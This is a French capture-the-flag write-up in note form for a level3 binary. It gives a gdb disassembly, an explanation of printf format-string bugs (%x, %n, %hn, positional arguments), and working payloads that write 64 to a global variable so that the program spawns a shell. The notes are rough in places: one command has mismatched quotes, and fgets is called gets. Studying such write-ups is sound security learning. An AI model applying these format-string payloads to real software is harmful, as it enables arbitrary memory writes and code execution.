(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:     push   %ebp
   0x0804851b <+1>:     mov    %esp,%ebp
   0x0804851d <+3>:     and    $0xfffffff0,%esp
   0x08048520 <+6>:     call   0x80484a4 <v>
   0x08048525 <+11>:    leave  
   0x08048526 <+12>:    ret    

On a un main qui ne fait pas grand chose a part call la fonction v

(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x218,%esp
   0x080484ad <+9>:     mov    0x8049860,%eax
   0x080484b2 <+14>:    mov    %eax,0x8(%esp)
   0x080484b6 <+18>:    movl   $0x200,0x4(%esp)
   0x080484be <+26>:    lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:    mov    %eax,(%esp)
   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:    lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:    mov    %eax,(%esp)
   0x080484d5 <+49>:    call   0x8048390 <printf@plt>
   0x080484da <+54>:    mov    0x804988c,%eax
   0x080484df <+59>:    cmp    $0x40,%eax
   0x080484e2 <+62>:    jne    0x8048518 <v+116>
   0x080484e4 <+64>:    mov    0x8049880,%eax
   0x080484e9 <+69>:    mov    %eax,%edx
   0x080484eb <+71>:    mov    $0x8048600,%eax
   0x080484f0 <+76>:    mov    %edx,0xc(%esp)
   0x080484f4 <+80>:    movl   $0xc,0x8(%esp)
   0x080484fc <+88>:    movl   $0x1,0x4(%esp)
   0x08048504 <+96>:    mov    %eax,(%esp)
   0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:   movl   $0x804860d,(%esp)
   0x08048513 <+111>:   call   0x80483c0 <system@plt>
   0x08048518 <+116>:   leave  
   0x08048519 <+117>:   ret   

On a encore un call a gets qui va surement nous servir pour faire un overflow

Mettons un b* dans v() apres le gets
Analysons les informations que nous avons

On a un seved eip : 0x8048525 
(gdb) x/i 0x8048525
   0x8048525 <main+11>: leave

On a eax qui pointe vers 0xbffff520 (notre chaine)
x/s 0xbffff520
0xbffff520:      "\n"

Ensuite notre buf est envoye a printf
0x804988c

0x080484da <+54>:    mov    0x804988c,%eax
                                
# Charge la valeur à l'adresse 0x804988c DANS eax
syntaxe AT&T
mov source, destination

syntaxe Intel
mov destination, source

A quoi correspond 0x804988c ?

(gdb) x/x 0x804988c
0x804988c <m>:  0x00000000

On voit un <m> qui apparait ici que je n'avais jamais vu avant
En cherchant un peu, j'ai vu que cette adresse etait dans la partie .bss du programme
0804988c  uint32_t m = 0x0
Variable gloable ?

b *v+62

Exploit printf ?

On passe en argument à notre programme des formateurs. Le programme se retrouve donc à exécuter
la chose suivante :
   printf("%x%x%x%x");
Seulement vous on remarque que la fonction printf() n'a pas d'arguments pour remplacer les formateurs dans la chaine.
Elle affiche donc ce qu'elle a sous la main, c'est à dire les valeurs présentes sur la pile.

Types de formateurs

Formateurs directs (comme %x) : Affichent directement la valeur ciblée sur la pile

Formateurs pointeurs (comme %s) : Affichent la valeur située à l'adresse ciblée

Formateur spécial %n : Écrit en mémoire le nombre de caractères affichés avant lui

Mécanisme d'exploitation
Fonctionnement

La fonction printf() parcourt la pile 4 octets par 4 octets pour trouver les valeurs à afficher

Sans arguments, printf() affiche les valeurs présentes sur la pile
Le formateur %n permet d'écrire en mémoire à une adresse spécifique
Technique d'exploitation

   Utilisation de %hn pour écrire 2 octets à la fois

Possibilité de contrôler le flux d'exécution en écrasant l'adresse de retour (EIP)
Utilisation de la notation %Nd pour générer des padding de taille contrôlée

Impact
Cette vulnérabilité permet notamment :

La lecture de données sensibles en mémoire
L'écriture à des adresses arbitraires
L'exécution de code arbitraire via la redirection du flux d'exécution


python -c "print '\x8c\x98\x04\x08' + ' + '%4$n'"

Le symbole $ dans %4$n est un paramètre de position qui permet d'accéder directement au 4ème argument sur la pile 

0xbffff520 adresse du buf

x/x 0xbffff520
0xbffff520:     0x0804988c --> CORRESPOND A NOTRE GLOBALE :D

Plus qu'a modifier sa valeur

"AAAA + "%x %x %x %x %x"

printf exploit --> 
r < <(python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"')
(python -c 'print "\x8c\x98\x04\x08" + "%60d" + "%4$n"'; cat) | ./level3
(python -c 'print "\x8c\x98\x04\x08" + "%60c" + "%4$n"'; cat) | ./level3
(python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"'; cat) | ./level3
